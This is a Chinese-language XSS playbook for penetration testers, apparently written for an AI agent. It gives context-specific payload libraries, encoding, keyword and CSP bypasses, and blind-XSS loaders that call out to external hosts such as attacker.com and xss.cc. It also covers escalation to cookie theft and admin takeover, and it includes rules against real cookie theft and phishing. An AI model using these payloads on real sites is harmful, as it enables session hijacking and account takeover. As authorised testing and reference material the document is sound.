# XSS — 决策索引

> 视角:用户输入回显到 HTML/JS,被浏览器解析为代码。本文件execution-framework + 路由表。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 看到自己的输入直接出现在响应 / 评论框 / 个人简介 / DOM 操作 | `10-xss-by-type.md`(反射 / 存储 / DOM 三大类) |
| payload 试出来被拦,要绕过 CSP / WAF / 过滤器 / 编码 | `11-bypass.md` |
| XSS 已能弹,要写真正的利用脚本(cookie 窃取 / 键盘记录 / BeEF) | `12-exploitation.md` |

---


> 视角：黑盒，目标是让脚本在受害者浏览器执行

## 1. 一句话说清

XSS = 把用户输入当代码执行（HTML/JS）。
- **存储型**：input 进 DB，访客触发——价值最高（盲打管理员）。
- **反射型**：input 在 URL 立即回显——价值最低，多数平台不收。
- **DOM**：纯客户端，不经服务端——常被遗漏。
- **mXSS**：序列化/反序列化时浏览器解析差异。

渗透价值：管理后台 stored XSS = P1；普通 reflected = P3（仅作攻击链组件）。

---

## 2. 高频输出点（按 wooyun 案例）

| 输出点 | 触发 | 典型 |
|--------|------|------|
| 用户昵称 / 签名 | 页面加载 | 个人主页、评论 |
| 搜索回显 | 搜索 | 历史 / 结果页 |
| 评论 / 留言 | 展示 | 论坛、商品评价 |
| 文件名 / 描述 | 列表 | 网盘、相册 |
| 邮件正文 / 标题 | 打开 | 邮箱系统 |
| URL 参数回显 | 渲染 | 分享链接 |
| 订单备注 | 后台查看 | 电商工单 |
| API 回调参数 | JS 执行 | JSONP |

### 易遗漏点

- **HTTP 头反射**：X-Forwarded-For → 日志后台、UA → 统计面板
- **Mobile/WAP 同步**：APP 写入 → Web 显示
- **二次渲染**：草稿箱 / 审核列表 / 后台
- **Source map / JSON 注入**：`/api/data?cb=alert(1)`

---

## 3. 探测手法

### 3.1 上下文识别（先看落点）

| 上下文 | 闭合 | 探针 |
|--------|------|------|
| HTML 标签内 | `<` | `<svg onload=alert(1)>` |
| 属性 | 引号 | `" autofocus onfocus=alert(1) "` |
| URL 属性 | 协议 | `javascript:alert(1)` |
| JS 字符串 | 引号 | `";alert(1);//` |
| JS JSON | 引号 + 闭合 | `'-alert(1)-'`、`"};alert(1);//` |
| CSS（IE） | 函数 | `xss:expression(alert(1))` |

### 3.2 Payload 库（按上下文）

#### HTML 标签内

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<frameset onload=alert(1)>
```

#### 属性内

```
" onclick=alert(1) "
" onmouseover=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
'-alert(1)-'
\";alert(1);//
```

#### JS 字符串

```js
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 3.3 编码绕过

| 编码 | 示例 |
|------|------|
| HTML 实体 | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| 16 进制实体 | `&#x3c;script&#x3e;` |
| Unicode | `<iframe/onload=alert(1)>` |
| URL | `%3cscript%3ealert(1)%3c/script%3e` |
| 双重 URL | `%253cscript%253e` |
| Base64 in data | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |

### 3.4 关键字 / 括号绕过

```js
// alert 绕过
window['al'+'ert'](1)
self['al'+'ert'](1)
Function('alert(1)')()
eval('al'+'ert(1)')
[].constructor.constructor('alert(1)')()

// Unicode 关键字
alert(1)

// 括号绕过
alert`1`                     // 模板字符串
throw onerror=alert,1        // 异常 + 简写
location='javascript:alert(1)'

// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

// btoa / atob
eval(atob('YWxlcnQoMSk='))
```

### 3.5 DOM XSS 危险源 / 汇

```js
// 源（攻击者可控）
location.href / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.referrer
window.name
document.cookie
postMessage data

// 汇（执行点）
eval()  Function()  setTimeout(string)  setInterval(string)
innerHTML / outerHTML / insertAdjacentHTML
document.write / document.writeln
element.src / element.href
$('...')   .html(...)
```

测试：
```bash
# 改 location.hash
https://target/page.html#<img src=x onerror=alert(1)>

# 改 location.search
https://target/page.html?q=</script><script>alert(1)</script>

# 改 referrer
访问 attacker.com → click → target.com（attacker.com 含 payload）

# postMessage（跨窗口）
parent.postMessage('<img src=x onerror=alert(1)>','*')
```

工具：浏览器 DevTools 断点 + Sources tab 跟踪。

### 3.6 盲打 XSS（管理员触发）

```html
<script src=https://your-xss-hunter.com/abc></script>
```

平台：
- **XSS Hunter Express**（自建）
- 自己的 OOB（webhook.site 简易但无 cookie 抓取）

适用：
- 后台审核（用户昵称 / 留言 / 反馈）
- 工单系统
- 留言反馈

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 标签拦 `<script>` | `<svg>`、`<img>`、`<details>`、`<marquee>`、`<video>` |
| `script` 关键字 | `<scr<script>ipt>`（双写）、`<sCrIpT>`（大小写）、`<%73cript>`（编码） |
| `alert` 关键字 | `confirm` / `prompt` / `print` / `top.alert` / `Function('alert(1)')()` |
| 引号过滤 | 无引号属性：`<img src=x onerror=alert(1)>` |
| 长度限制 | 外部加载 `<script src=//xss.cc/j>` / 短链 |
| HTML5 sandbox | `<iframe srcdoc>` 内的 `<script>` |
| HTTPOnly Cookie | XSS 读不到，但仍能 CSRF / 钓鱼 / 改密码 |
| CSP | `script-src 'self'` 时找 jsonp endpoint / unsafe-eval / dangling markup |

### CSP 绕过常见思路

```
1. CSP 含 'unsafe-inline' → 直接 inline script
2. CSP 含 'unsafe-eval' → eval / Function
3. CSP 含 jsonp 友好域 → <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.0/angular.js"></script>
4. nonce 静态 → 复用
5. base-uri 缺 → <base href="//attacker.com">
6. dangling markup（无脚本）→ <img src='//attacker.com/?
```

---

## 5. 利用提权 / 横向

```
反射 XSS → 钓鱼链接 → cookie 偷取（无 HttpOnly）
存储 XSS → 后台 admin 触发 → 偷 cookie / CSRF / 改密码 / 读页面
DOM XSS → 同上
mXSS → 复制粘贴 / 邮件预览触发

→ 渗透测试报告时不要做实际钓鱼。仅 alert(1) 弹窗 / cookie/document.domain 截图 即可
```

### 配合升级

```
反射 XSS + Self-XSS（自己后台只能给自己看） → 配合 CSRF 让别人帮触发 → P0
存储 XSS + 后台 → 后台沦陷 → P0
DOM XSS + postMessage → 跨域读 → P0
```

---

## 6. 真实案例指纹

| 类型 | 案例 |
|------|------|
| 存储 XSS | 大街网（蠕虫）、某社交（蠕虫） |
| 反射 XSS | 开心网、某搜索引擎贴吧 |
| DOM XSS | 某互联网公司 document.domain、某社交 Flash htmlText |
| Flash XSS | 音悦台 LSO Rootkit、某邮箱 crossdomain.xml |
| mXSS | 某社交邮箱、某邮箱 |
| 盲打 | 苏宁、成都公安、快速问医生（管理员触发） |

通用指纹：
- 输入 `<svg onload=alert(1)>` 显示在 DOM 中（F12 看 elements） → 命中
- 浏览器 alert 弹窗 → 命中
- HTML 中含 `<script>` 包裹的不可信数据 → 模板渲染缺转义

---

## 7. 复现 / 证据要点

### 7.1 PoC 必备

1. 触发 URL（含 payload）
2. **alert 弹窗截图**（含 URL bar）
3. DOM 内 payload 截图（F12）
4. 不同浏览器测试结果（Chrome / Firefox / Safari，至少 2 个）
5. CSP / X-XSS-Protection 头分析

### 7.2 模板

```http
GET /search?q=%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
Host: target.com

→ HTML 响应中：
<div class="search-result">您搜索的内容：<svg onload=alert(document.domain)></div>

→ 浏览器执行 alert，弹出：target.com
```

### 7.3 CVSS

```
存储 XSS（管理后台）        = 6.1–8.0
存储 XSS（用户互看）        = 6.1
反射 XSS（无认证）          = 6.1
DOM XSS                    = 6.1
Self-XSS（自己看自己）      = 通常拒收
mXSS / 邮件预览             = 6.5–8.1
盲打成功（admin 触发）       = 7.5–8.5
```

### 7.4 影响段

```
通过 /search 接口的 q 参数，攻击者可注入 HTML/JS 代码并在受害者浏览器执行。
该参数无认证可访问，CSP 仅设 default-src 'self'，未限制 inline。

实际可：
1. 偷取受害者会话 cookie（无 HttpOnly 时）
2. 触发 CSRF 完成敏感操作
3. 钓鱼到伪造登录页

测试时仅用 alert(document.domain) 弹窗证明，未尝试任何 cookie 偷取。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__browser_evaluate_cdp_target` | browser | 在受害域执行 payload 验证 DOM XSS / 盲打 |
| `mcp__jshook__ast_transform_apply` | transform | 反混淆混淆 JS / AST 改写还原 sink |
| `mcp__jshook__debugger_pause` + `mcp__jshook__get_call_stack` | debugger | 设断点追踪 sink 调用链 |
| `mcp__jshook__hook_preset` | hooks | 装 eval / atob / Function preset,捕获运行时反序列化 |
| `mcp__jshook__sourcemap_reconstruct_tree` | sourcemap | 还原原始源码定位 sink |

完整映射:[`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：实际偷取真实用户 cookie / token。Self-cookie 演示即可。
- **禁**：用存储 XSS 在公开评论区埋 payload（其他人会触发）。在自己控制的位置（自己的留言、自己的records）测。
- **禁**：盲打到陌生管理员的 cookie 后用它登录。仅证明回调收到，截图后立即作废。
- **禁**：构造真实钓鱼页面（伪造登录）。
- **禁**：批量蠕虫式传播（一个朋友圈或全平台）。
- **报告中**：cookie / token 必须脱敏到只剩 head/tail。

## H1 真实案例

_共 335 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | — | GitLab | [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) | Summary I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages |
| High | 1000 usd | Rockstar Games | [The return of the ＜](https://hackerone.com/reports/639684) | The return of the ＜ |
| Critical | 7500 usd | Valve | [XSS in steam react chat client](https://hackerone.com/reports/409850) | The Steam chat client both sends and receives bbcode format chat messages |
| High | — | Grab | [[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/401793) | [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure |
| Critical | 16000 usd | GitLab | [Stored XSS in markdown via the DesignReferenceFilter](https://hackerone.com/reports/1212067) | Summary When rendering markdown, links to designs are parsed using the following `link_reference_pattern`: https://gitlab.com/g… |
| High | — | TikTok | [Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082) | Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration |
| Critical | 1000 usd | CS Money | [Blind XSS on image upload](https://hackerone.com/reports/1010466) | Summary: The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ ori… |
| High | 5000 usd | Reddit | [[accounts.reddit.com] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) | Summary: Hello team! I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Sit… |
| High | 13950 usd | GitLab | [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) | Summary If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the r… |
| Critical | 5000 usd | Basecamp | [HEY.com email stored XSS](https://hackerone.com/reports/982291) | An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails |
| High | — | WordPress | [Stored XSS Vulnerability](https://hackerone.com/reports/643908) | Hi there, I found a stored xss @ https://core.trac.wordpress.org/ Steps: 1 |
| Critical | — | X / xAI | [Blind XSS on Twitter's internal Big Data panel at █████████████](https://hackerone.com/reports/1207040) | Blind XSS on Twitter's internal Big Data panel at █████████████ |

**命中本类的 weakness 分布：**

- Cross-site Scripting (XSS) - Stored：166 条
- Cross-site Scripting (XSS) - Generic：74 条
- Cross-site Scripting (XSS) - Reflected：51 条
- Cross-site Scripting (XSS) - DOM：29 条
- Uncategorized → 手工归类：12 条
- Reflected XSS：1 条
- Improper Neutralization of HTTP Headers for Scripting Syntax：1 条
- Cross-Site Scripting (XSS)：1 条



---

完整 Payload 库见同级子文件。
